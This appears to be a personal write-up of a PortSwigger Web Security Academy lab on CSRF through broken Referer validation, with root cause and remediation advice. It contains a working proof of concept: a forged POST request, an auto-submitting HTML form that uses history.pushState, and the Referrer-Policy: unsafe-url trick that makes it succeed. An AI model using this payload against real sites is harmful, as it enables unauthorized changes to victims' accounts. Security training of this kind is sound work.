CSRF — Broken Referer Validation

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: Cross-Site Request Forgery (CSRF)
Tools: Burp Suite Community Edition, Burp Repeater, HTML, JavaScript, Exploit Server
Status: Browser exploit verified
Challenge: 30 Days of Web Security — Day 03

1. Objective

Identify and exploit a CSRF vulnerability caused by improper validation of the HTTP Referer header.

The application attempts to prevent cross-site requests by checking whether the Referer header contains its own domain.

However, it does not correctly validate the actual origin of the request.

2. Attack Scenario

An attacker wants to change the email address of an authenticated victim.

The application uses the Referer header as a CSRF protection mechanism.

The attacker discovers that the server accepts requests whenever the expected domain appears anywhere in the Referer value, even when the request originates from an attacker-controlled website.

This allows the attacker to construct a malicious page that causes the victim's browser to submit an unauthorized email change request.

3. Testing Referer Validation

I intercepted an email change request and sent it to Burp Repeater.

I modified the Referer header:

POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Referer: https://attacker.example/?<LAB-HOST>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net

Result: The server accepted the request, and the email address changed successfully.

Although the actual Referer domain was attacker.example, the vulnerable application accepted the request because the expected laboratory hostname appeared in the URL query string.

This confirmed improper Referer validation.

4. Exploit Construction

I created an HTML proof of concept using PortSwigger Exploit Server.

<!DOCTYPE html>
<html>
<body>

<form action="https://<LAB-HOST>/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="csrf-lab11@example.net">

</form>

<script>
    history.pushState("", "", "/?<LAB-HOST>");
    document.forms[0].submit();
</script>

</body>
</html>

The history.pushState() function modifies the current page URL without reloading the page.

This places the target application's hostname in the query string of the attacker-controlled page.

When the form is submitted, the browser can include this URL in the Referer header.

5. Troubleshooting Referrer-Policy

During initial testing, the browser-based exploit failed with:

Invalid referer header

The cause was the browser's default referrer policy, which prevented the full cross-site URL from being included in the request.

To resolve this, I added the following HTTP response header to the Head section of PortSwigger Exploit Server:

Referrer-Policy: unsafe-url

After storing and testing the modified exploit, the email change succeeded.

This demonstrated that the browser could be instructed to include the full referring URL, allowing the target hostname to appear inside the Referer header.

6. Attack Flow
Attacker hosts malicious HTML page
                |
                v
Victim opens the page
                |
                v
history.pushState() modifies the page URL
                |
                v
Referrer-Policy: unsafe-url
allows the full Referer value
                |
                v
Browser submits the email change POST
                |
                v
Server finds its hostname inside Referer
                |
                v
Incorrect validation accepts the request
                |
                v
Victim's email address is changed

The attack requires the victim's authenticated session cookie to accompany the request.

7. Root Cause and Impact

Root cause: The application performs an insecure substring check on the Referer header instead of validating the actual origin.

Confirmed impact: Unauthorized email modification in the laboratory environment.

Depending on additional account recovery and verification mechanisms, this vulnerability could contribute to account compromise.

A complete account takeover was not demonstrated.

8. Remediation
Use unpredictable CSRF tokens securely bound to authenticated sessions.
Validate the actual origin instead of searching for a trusted domain substring.
Parse URLs correctly and compare their scheme, hostname, and port where appropriate.
Use the Origin header and carefully validated Referer information as additional defenses.
Apply appropriate SameSite cookie settings.
Require additional verification for sensitive account changes.
9. Key Takeaways

This lab demonstrated that a security check can exist but still be fundamentally insecure.

I practiced:

Manipulating HTTP headers with Burp Repeater.
Identifying incorrect Referer validation.
Using history.pushState() to influence the referring URL.
Understanding the role of Referrer-Policy.
Troubleshooting a failed browser-based CSRF exploit.
Building a complete CSRF proof of concept.

Main lesson: Finding a trusted domain somewhere inside a URL does not prove that the request originated from that domain.

Environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.

